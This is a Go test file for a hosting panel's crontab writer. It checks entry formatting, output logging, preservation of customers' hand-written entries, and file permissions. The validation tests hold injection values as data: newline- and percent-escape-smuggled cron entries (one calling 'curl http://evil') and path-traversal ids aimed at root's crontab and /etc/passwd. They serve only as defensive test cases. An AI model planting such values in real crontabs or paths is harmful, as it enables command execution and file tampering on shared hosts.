package cron

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// The crontab writer is tested against real files, because what it must get
// right is a file's contents: a file shared with a customer who may have
// written entries in it years before this panel existed.

func init() {
	// A fixed clock, so the "written at" comment does not make every expected
	// file different from the last.
	timeNow = func() time.Time { return time.Date(2026, time.August, 31, 9, 0, 0, 0, time.UTC) }
}

func job(overrides func(*Job)) Job {
	j := Job{
		ID:       "8f3c2b1a-4d5e-4a6b-8c7d-9e0f1a2b3c4d",
		Name:     "Nightly dump",
		Schedule: "0 3 * * *",
		Command:  "php /var/www/shop.example/public/cron.php",
		Enabled:  true,
	}
	if overrides != nil {
		overrides(&j)
	}
	return j
}

// provider builds a Provider writing into a temporary spool directory.
func provider(t *testing.T) (*Provider, string) {
	t.Helper()

	dir := t.TempDir()
	spool := filepath.Join(dir, "spool")
	logs := filepath.Join(dir, "logs")
	if err := os.MkdirAll(spool, 0o755); err != nil {
		t.Fatalf("create spool: %v", err)
	}
	p := NewProvider(Options{SpoolDir: spool, LogDir: logs})
	return p, spool
}

// writeFor exercises the file half of Apply without needing a real account.
func writeFor(t *testing.T, p *Provider, account string, jobs []Job) string {
	t.Helper()

	path := p.crontabPath(account)
	if err := p.write(path, jobs); err != nil {
		t.Fatalf("write: %v", err)
	}

	content, err := os.ReadFile(path) //nolint:gosec // a path this test just built
	if err != nil {
		if os.IsNotExist(err) {
			return ""
		}
		t.Fatalf("read back: %v", err)
	}
	return string(content)
}

func TestWriteProducesAnEntryCronCanRead(t *testing.T) {
	p, _ := provider(t)

	content := writeFor(t, p, "web_shop", []Job{job(nil)})

	if !strings.Contains(content, "0 3 * * * ( php /var/www/shop.example/public/cron.php )") {
		t.Fatalf("the entry is not in the file:\n%s", content)
	}
	if !strings.Contains(content, "# Nightly dump (job 8f3c2b1a-4d5e-4a6b-8c7d-9e0f1a2b3c4d)") {
		t.Fatalf("the job is not identified in the file:\n%s", content)
	}
	// The output goes to the job's own log. Cron's default is to mail it, which
	// on a host with no mail server discards it — and then "the job printed an
	// error" and "the job printed nothing" look identical.
	if !strings.Contains(content, ">> "+p.LogPath(job(nil).ID)+" 2>&1") {
		t.Fatalf("the entry does not collect its output:\n%s", content)
	}
}

// "run this, then that" is what half of all command lines look like, and
// `a; b >> log` redirects only b. The half that would be missing from the log
// is, reliably, the half that failed.
func TestTheWholeCommandIsRedirected(t *testing.T) {
	p, _ := provider(t)

	content := writeFor(t, p, "web_shop", []Job{
		job(func(j *Job) { j.Command = "php cron.php; php queue.php" }),
	})

	want := "( php cron.php; php queue.php ) >> " + p.LogPath(job(nil).ID) + " 2>&1"
	if !strings.Contains(content, want) {
		t.Fatalf("the compound command is not redirected as a whole:\n%s", content)
	}
	// Vixie cron silently ignores a last line with no newline, which produces a
	// job that is in the file and never runs.
	if !strings.HasSuffix(content, "\n") {
		t.Fatal("the file does not end with a newline")
	}
}

// The file is shared with whoever else uses this account. What the panel did
// not write, it does not touch.
func TestWriteLeavesTheCustomersOwnEntriesAlone(t *testing.T) {
	p, spool := provider(t)
	path := filepath.Join(spool, "web_shop")

	handWritten := "# my own jobs\n30 2 * * * /home/web_shop/backup.sh\n"
	if err := os.WriteFile(path, []byte(handWritten), 0o600); err != nil {
		t.Fatalf("seed: %v", err)
	}

	content := writeFor(t, p, "web_shop", []Job{job(nil)})

	if !strings.Contains(content, "30 2 * * * /home/web_shop/backup.sh") {
		t.Fatalf("a hand-written entry was lost:\n%s", content)
	}
	if !strings.Contains(content, "# my own jobs") {
		t.Fatalf("a hand-written comment was lost:\n%s", content)
	}

	// And removing the panel's jobs leaves them still there.
	content = writeFor(t, p, "web_shop", nil)
	if !strings.Contains(content, "30 2 * * * /home/web_shop/backup.sh") {
		t.Fatalf("a hand-written entry was lost when the block was removed:\n%s", content)
	}
	if strings.Contains(content, beginMarker) {
		t.Fatalf("the managed block was left behind:\n%s", content)
	}
}

func TestWriteReplacesTheBlockRatherThanAppendingAnother(t *testing.T) {
	p, _ := provider(t)

	writeFor(t, p, "web_shop", []Job{job(nil)})
	content := writeFor(t, p, "web_shop", []Job{
		job(func(j *Job) { j.Name = "Renamed"; j.Schedule = "0 4 * * *" }),
	})

	if strings.Count(content, beginMarker) != 1 {
		t.Fatalf("the block was written twice:\n%s", content)
	}
	if strings.Contains(content, "0 3 * * *") {
		t.Fatalf("the previous schedule survived:\n%s", content)
	}
	if !strings.Contains(content, "0 4 * * *") {
		t.Fatalf("the new schedule is missing:\n%s", content)
	}
}

// Someone deleted the end marker by hand. The panel must still be able to
// manage jobs rather than refusing until a person repairs a file they may not
// know exists.
func TestWriteRecoversFromABlockWithNoEnd(t *testing.T) {
	p, spool := provider(t)
	path := filepath.Join(spool, "web_shop")

	damaged := "# mine\n0 1 * * * /home/web_shop/mine.sh\n" + beginMarker + "\n0 3 * * * old\n"
	if err := os.WriteFile(path, []byte(damaged), 0o600); err != nil {
		t.Fatalf("seed: %v", err)
	}

	content := writeFor(t, p, "web_shop", []Job{job(nil)})

	if strings.Count(content, beginMarker) != 1 {
		t.Fatalf("the damaged block was not replaced:\n%s", content)
	}
	if strings.Contains(content, "0 3 * * * old") {
		t.Fatalf("the old entry survived:\n%s", content)
	}
	if !strings.Contains(content, "0 1 * * * /home/web_shop/mine.sh") {
		t.Fatalf("the entry before the marker was lost:\n%s", content)
	}
}

// A disabled job is absent, not commented out. A commented entry is one
// `crontab -e` away from running, and the panel would not know it had been
// re-enabled.
func TestADisabledJobIsNotInTheFileAtAll(t *testing.T) {
	p, _ := provider(t)

	content := writeFor(t, p, "web_shop", nil)
	if strings.Contains(content, "cron.php") {
		t.Fatalf("a disabled job reached the file:\n%s", content)
	}
}

// An environment assignment applies to every entry after it in the file, so one
// written inside the panel's block would change how the customer's own entries
// below it behave.
func TestTheBlockSetsNoEnvironment(t *testing.T) {
	p, _ := provider(t)

	content := writeFor(t, p, "web_shop", []Job{job(nil)})
	for _, name := range []string{"SHELL=", "PATH=", "MAILTO=", "CRON_TZ="} {
		if strings.Contains(content, name) {
			t.Fatalf("the block sets %s, which changes entries outside it:\n%s", name, content)
		}
	}
}

func TestWriteRemovesAFileWithNothingLeftInIt(t *testing.T) {
	p, spool := provider(t)

	writeFor(t, p, "web_shop", []Job{job(nil)})
	writeFor(t, p, "web_shop", nil)

	if _, err := os.Stat(filepath.Join(spool, "web_shop")); !os.IsNotExist(err) {
		t.Fatal("an empty crontab was left behind")
	}
}

func TestTheCrontabIsPrivate(t *testing.T) {
	p, spool := provider(t)
	writeFor(t, p, "web_shop", []Job{job(nil)})

	info, err := os.Stat(filepath.Join(spool, "web_shop"))
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	// Vixie cron refuses a crontab that is group- or world-writable, and a job
	// that silently stops running is the failure this avoids.
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Fatalf("mode = %o, want 600", perm)
	}
}

// The validation that stands between one entry and two. These values must never
// reach a file, whatever else is wrong.
func TestJobValidateRefusesWhatWouldWriteASecondEntry(t *testing.T) {
	cases := []struct {
		name   string
		mutate func(*Job)
	}{
		{"a command with a newline", func(j *Job) {
			j.Command = "php cron.php\n* * * * * curl http://evil"
		}},
		{"a name with a newline", func(j *Job) {
			j.Name = "nightly\n* * * * * id"
		}},
		{"a schedule with a newline", func(j *Job) {
			j.Schedule = "0 3 * * *\n0 4 * * * id"
		}},
		{"cron's percent escape", func(j *Job) {
			j.Command = "php cron.php %0a* * * * * id"
		}},
		{"an id that is not one", func(j *Job) {
			j.ID = "../../../etc/crontabs/root"
		}},
		{"an empty command", func(j *Job) { j.Command = "" }},
		{"a schedule with six fields", func(j *Job) { j.Schedule = "* * * * * *" }},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := job(tc.mutate).Validate(); err == nil {
				t.Fatalf("%s was accepted", tc.name)
			}
		})
	}

	if err := job(nil).Validate(); err != nil {
		t.Fatalf("an ordinary job was refused: %v", err)
	}
}

// A job cannot name a file outside the log directory, because its id is
// checked before it becomes one.
func TestLogPathsStayInTheLogDirectory(t *testing.T) {
	p, _ := provider(t)

	if err := p.RemoveLog("../../etc/passwd"); err == nil {
		t.Fatal("an id that is a path was accepted")
	}

	path := p.LogPath("8f3c2b1a-4d5e-4a6b-8c7d-9e0f1a2b3c4d")
	if filepath.Dir(path) != p.LogDir() {
		t.Fatalf("log path %q is outside %q", path, p.LogDir())
	}
}

// Deleting a website removes its account's whole block, and the logs of the
// jobs that were in it go too. Without this, a deleted site leaves a log file
// per job that nothing in the panel can name, sitting in the log viewer for
// ever.
func TestRemovingAnAccountsBlockTakesItsJobLogsWithIt(t *testing.T) {
	p, spool := provider(t)

	first := job(nil)
	second := job(func(j *Job) {
		j.ID = "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d"
		j.Name = "Queue worker"
	})

	// The logs exist because Apply creates them; here they are made directly,
	// since Apply needs a real account.
	if err := os.MkdirAll(p.LogDir(), 0o755); err != nil {
		t.Fatalf("make log dir: %v", err)
	}
	for _, id := range []string{first.ID, second.ID} {
		if err := os.WriteFile(p.LogPath(id), []byte("output\n"), 0o640); err != nil {
			t.Fatalf("write log: %v", err)
		}
	}

	writeFor(t, p, "web_shop", []Job{first, second})

	// The identifiers are read back out of the block this package wrote.
	content, err := os.ReadFile(filepath.Join(spool, "web_shop"))
	if err != nil {
		t.Fatalf("read back: %v", err)
	}
	ids := managedJobIDs(string(content))
	if len(ids) != 2 || ids[0] != first.ID || ids[1] != second.ID {
		t.Fatalf("ids = %q, want both jobs", ids)
	}

	for _, id := range ids {
		if err := p.RemoveLog(id); err != nil {
			t.Fatalf("RemoveLog: %v", err)
		}
		if _, err := os.Stat(p.LogPath(id)); !os.IsNotExist(err) {
			t.Fatalf("the log for %s was left behind", id)
		}
	}
}

// Only the panel's own entries are read back — an entry a customer wrote by
// hand is none of this package's business, even if it looks similar.
func TestManagedJobIDsIgnoresEverythingOutsideTheBlock(t *testing.T) {
	outside := "# theirs (job 8f3c2b1a-4d5e-4a6b-8c7d-9e0f1a2b3c4d)\n" +
		"0 1 * * * /home/web_shop/mine.sh\n"

	if ids := managedJobIDs(outside); len(ids) != 0 {
		t.Fatalf("ids = %q, want none: that comment is not in a managed block", ids)
	}
}

func TestAvailableFollowsTheSpoolDirectory(t *testing.T) {
	p, spool := provider(t)
	if !p.Available() {
		t.Fatal("a host with a spool directory reported no cron")
	}

	if err := os.RemoveAll(spool); err != nil {
		t.Fatalf("remove spool: %v", err)
	}
	if p.Available() {
		t.Fatal("a host with nowhere to write crontabs reported cron as available")
	}
}
